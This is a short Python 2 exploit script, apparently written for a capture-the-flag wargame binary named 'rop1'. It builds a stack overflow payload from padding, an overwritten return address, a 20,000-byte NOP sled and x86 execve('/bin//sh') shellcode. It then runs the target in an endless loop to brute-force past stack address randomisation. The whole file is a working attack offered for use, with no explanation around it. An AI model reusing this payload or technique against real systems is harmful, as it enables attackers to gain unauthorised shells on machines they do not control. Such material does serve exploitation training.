import os
import sys
from struct import pack
import subprocess

# 0xfffdd000 0xffffe000

def dd(v):
  return pack("I", v)

b = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD"
b += dd(0xffff0123)
b += "\x90" * 20000
b += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" #  Hamza Megahed
b += "\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

#print b

while True:
  print subprocess.call(["/home/rop1/rop1", b])

